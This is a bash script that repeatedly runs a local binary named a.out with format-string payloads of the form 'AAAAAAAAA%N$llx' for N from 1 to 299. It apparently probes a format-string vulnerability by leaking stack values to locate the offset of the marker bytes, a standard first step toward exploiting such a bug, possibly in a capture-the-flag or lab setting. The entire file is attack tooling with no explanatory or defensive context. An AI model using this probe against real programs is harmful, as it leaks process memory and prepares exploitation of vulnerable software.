#!/bin/bash

for((i=1; i<300; i++));
do
    echo -n "$i " && ./a.out "AAAAAAAAA%$i\$llx" && echo
done
